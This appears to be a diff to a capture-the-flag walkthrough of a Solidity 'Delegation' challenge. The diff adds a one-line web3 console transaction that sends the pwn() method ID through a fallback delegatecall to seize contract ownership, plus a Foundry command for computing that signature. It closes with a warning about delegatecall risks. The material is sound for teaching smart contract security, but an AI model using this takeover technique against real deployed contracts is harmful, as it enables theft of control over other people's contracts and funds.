@@ -35,8 +35,8 @@ A [fallback function](https://solidity-by-example.org/fallback/) is executed eit
 [delegatecall](https://solidity-by-example.org/delegatecall/) is a low level function similar to call... when contract A exectutes delegatecall to contract B, contract B's code is executed using contract A's storage
 The [method id](https://ethereum.stackexchange.com/questions/118336/how-to-get-methodid-of-a-function-in-a-smart-contract) is the first 4 bytes of the hash of a function name and parameters
 Using the information above, we can make a call to the ``Delegate`` contract using the ``Delegation`` contract.
-When this call is made, the storage of the ``Delegation`` contract will be used.    - Our goal is to become the owner of the
-``Delegation`` contract, so we can use the ``methodID`` of the ``pwn()`` function found in ``Delegate`` and send that as a transaction:
+When this call is made, the storage of the ``Delegation`` contract will be used.    
+- Our goal is to become the owner of the ``Delegation`` contract, so we can use the ``methodID`` of the ``pwn()`` function found in ``Delegate`` and send that as a transaction:
 ```js
 let methodID = web3.utils.sha3("pwn()").substring(0, 10);
 
@@ -48,6 +48,11 @@ web3.eth.sendTransaction({
 ```
 The ``pwn`` function will be called from the ``Delegate`` contract using the storage of ``Delegation``
 If we call ``await contract.owner()``, we should now be the owner
+A simpler way to do this in the console:
+```js
+await contract.sendTransaction({from: player, to: contract.address, data: "0xdd365b8b"})
+```
+- Using Foundry, we can run `cast sig "pwn()"` to get the function signature 
 
 #### Summary
 Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.
